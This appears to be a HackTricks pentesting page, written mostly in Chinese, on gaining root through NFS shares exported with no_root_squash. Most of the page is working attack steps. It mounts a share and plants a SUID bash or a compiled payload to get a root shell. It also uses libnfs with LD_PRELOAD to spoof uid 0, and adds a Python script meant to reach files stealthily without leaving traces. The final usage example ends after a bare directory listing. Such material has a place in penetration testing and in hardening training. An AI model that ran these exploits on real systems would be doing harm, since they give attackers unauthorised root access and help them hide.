# NFS No Root Squash Misconfiguration Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}


## Squashing 基础信息

NFS 通常（尤其是在 Linux 中）会信任用于访问文件的客户端所指示的 `uid` 和 `gid`（如果未使用 Kerberos）。不过，服务器中可以设置一些配置来**更改此行为**：

- **`all_squash`**：它会 squash 所有访问，将每个用户和组映射为 **`nobody`**（65534 无符号 / -2 有符号）。因此，所有人都是 `nobody`，不会使用任何用户。
- **`root_squash`/`no_all_squash`**：这是 Linux 中的默认配置，**只会 squash uid 0（root）** 的访问。因此，任何 `UID` 和 `GID` 都会被信任，但 `0` 会被 squash 为 `nobody`（所以无法进行 root impersonation）。
- **`no_root_squash`**：启用此配置后，甚至不会 squash root 用户。这意味着，如果你挂载了使用此配置的目录，就可以以 root 身份访问该目录。

在 **/etc/exports** 文件中，如果发现某个目录配置为 **no_root_squash**，那么你就可以**作为客户端**访问该目录，并且**以**本机本地 **root** 的身份在该目录中**写入**内容。

有关 **NFS** 的更多信息，请查看：


{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Privilege Escalation

### Remote Exploit

使用 bash 的选项 1：
- **在客户端机器上挂载该目录**，然后**以 root 身份将** **/bin/bash** 二进制文件复制到已挂载的目录中，并为其设置 **SUID** 权限，最后在**受害者**机器上执行该 bash 二进制文件。
- 注意，要在 NFS share 中成为 root，服务器必须配置 **`no_root_squash`**。
- 但是，如果未启用该配置，你仍然可以通过将二进制文件复制到 NFS share，并以目标用户的身份为其设置 SUID 权限，从而提升为其他用户。
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
使用 C 编译代码的选项 2：
- **在客户端机器上挂载该目录**，然后以 **root 身份将我们编译好的 payload 复制到**挂载目录中，利用 SUID 权限，为其赋予 **SUID** 权限，并在**受害者**机器上执行该二进制文件（你可以在这里找到一些 [C SUID payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)）。
- 与之前相同的限制
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
### Local Exploit

> [!TIP]
> 注意，如果你可以**从自己的机器到受害机器创建 tunnel，则仍然可以使用 Remote 版本，通过 tunnelling 所需端口来利用此 privilege escalation**。\
> 以下 trick 适用于 `/etc/exports` **指示了一个 IP** 的情况。在这种情况下，你在任何情况下都**无法使用** **remote exploit**，因此需要**滥用此 trick**。\
> 要使 exploit 正常工作，另一个必要条件是，**`/etc/export` 内的 export** **必须使用 `insecure` flag**。\
> --_我不确定如果 `/etc/export` 指示了一个 IP 地址，此 trick 是否会生效_--

### Basic Information

该场景涉及在本地机器上利用已挂载的 NFS share，借助 NFSv3 specification 中的一个 flaw：该 specification 允许 client 指定其 uid/gid，从而可能实现未授权访问。利用过程使用 [libnfs](https://github.com/sahlberg/libnfs)，这是一个允许伪造 NFS RPC calls 的 library。

#### Compiling the Library

Library 的 compilation steps 可能需要根据 kernel version 进行调整。在此特定情况下，fallocate syscalls 被注释掉了。Compilation process 包括以下 commands：
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
#### Conducting the Exploit

该 exploit 涉及创建一个简单的 C 程序（`pwn.c`），将权限提升为 root，然后执行 shell。程序经过编译后，使用 `ld_nfs.so` 在 RPC 调用中伪造 uid，并将生成的二进制文件（`a.out`）以 suid root 的身份放置在 share 上：

1. **Compile the exploit code:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **将 exploit 放到 share 上，并通过伪造 uid 修改其权限：**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **执行 exploit 以获得 root 权限：**
```bash
/mnt/share/a.out
#root
```
### Bonus: NFShell for Stealthy File Access

获得 root access 后，为了在不更改所有权的情况下与 NFS share 交互（避免留下痕迹），使用 Python script（nfsh.py）。该 script 会调整 uid，使其与所访问文件的 uid 匹配，从而无需处理权限问题即可与 share 上的文件交互：
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
运行方式：
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
{{#include ../../banners/hacktricks-training.md}}
